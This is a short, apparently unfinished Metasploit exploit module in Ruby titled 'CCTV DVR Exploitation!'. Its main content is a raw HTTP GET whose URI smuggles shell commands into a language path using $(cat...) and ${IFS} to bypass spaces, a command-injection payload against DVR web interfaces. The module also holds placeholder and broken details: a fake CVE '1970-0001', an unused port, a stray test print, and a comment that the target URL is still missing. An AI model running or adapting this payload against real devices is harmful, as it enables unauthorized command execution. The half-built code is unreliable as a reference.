##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CCTV DVR Exploitation!',
			'Description'    => %q{
				CCTV DVR Exploitation!.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'todb'
				],
			'References'     =>
				[
					[ 'CVE', '1970-0001' ]
				],
			'Platform'          => [ 'linux' ],
			'Targets'        =>
				[
					['Universal', {}]
				],
			'DisclosureDate' => 'Mar 22 2016',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The output file name.', 'test.txt'])
			], self.class)

	end

	def exploit
		run
	end

def run
	    print ("test")
            uri = target_uri.path


		port = "666"


        res3 =      send_request_raw({
        		'method'    => 'GET',
        		 		'headers'   => {
                'Accept-Encoding' => 'identity'
            },
        		'uri'=>"/language/Swedish&&$(cat${IFS}f)${IFS}&>r&&${IFS}/s",
       
        		'agent' => ''
        	})
#        puts res3.body
#need to add target url
end

        



end
